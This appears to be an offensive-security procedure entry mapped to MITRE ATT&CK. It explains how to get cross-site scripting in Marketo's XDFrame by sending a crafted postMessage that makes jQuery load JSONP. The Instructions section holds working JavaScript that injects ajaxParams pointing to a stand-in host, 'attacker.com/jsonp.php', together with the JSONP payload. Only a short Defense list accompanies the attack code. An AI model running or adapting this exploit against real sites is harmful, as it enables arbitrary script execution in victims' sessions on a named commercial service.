---
id: proc-trigger-jsonp-xss-postmessage
tags:
  - xss
  - jsonp
  - postmessage
type: procedure
tactics:
  - '[[Execution]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[JavaScript]]'
updated_at: '2025-12-13T23:56:03.976Z'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# Trigger-JSONP-XSS-via-postMessage

## Summary

This procedure exploits the Marketo XDFrame's unvalidated postMessage handling by injecting ajaxParams to load a malicious JSONP script, achieving XSS in the marketo.com context.

## Description

Marketo's iframe listens for postMessage without origin checks and passes parameters directly to jQuery.ajax, allowing specification of 'jsonp' dataType and arbitrary URLs. This loads external scripts as if from the iframe's domain. Prerequisites: Springboard page from prior procedure. Outcome: Arbitrary JS execution, e.g., alerting the domain.

## Requirements

1. Hosted JSONP endpoint (e.g., jsonp.php returning callback with JS payload)
2. Access to the springboard page's script
3. Browser console for verification

## Defense

Defensive measures and detection strategies:

- Validate postMessage origins strictly
- Sanitize and whitelist ajax parameters
- Use CSP to block script injections from third-parties

## Objectives

1. Send crafted postMessage to inject ajaxParams
2. Load and execute malicious JSONP
3. Confirm XSS in iframe context

## Instructions

### Step 1: Add Message Listener

**Context**: Listen for initial messages from the Marketo iframe to capture its source for responding.

Add to springboard script:

```javascript
window.addEventListener('message', function(event) {
  if (event.origin === 'https://app-sj17.marketo.com') {
    console.log('Received from Marketo:', event.data);
  }
});
```

> Logs incoming messages; reload page to trigger.

### Step 2: Send Malicious postMessage

**Context**: Respond to Marketo's message with ajaxParams to trigger JSONP load.

Extend the listener:

```javascript
window.addEventListener('message', function(event) {
  if (event.origin === 'https://app-sj17.marketo.com') {
    event.source.postMessage({
      ajaxParams: {
        'url': 'https://attacker.com/jsonp.php?callback=inject',
        'dataType': 'jsonp',
        'method': 'get'
      }
    }, event.origin);
  }
});
```

> jsonp.php: `inject({}); alert('XSS in ' + document.domain);` Expected: Alert in iframe.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]] Execution

### Techniques

- [[JavaScript]] JavaScript

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- [[xss]]
- [[jsonp]]
- [[postmessage]]
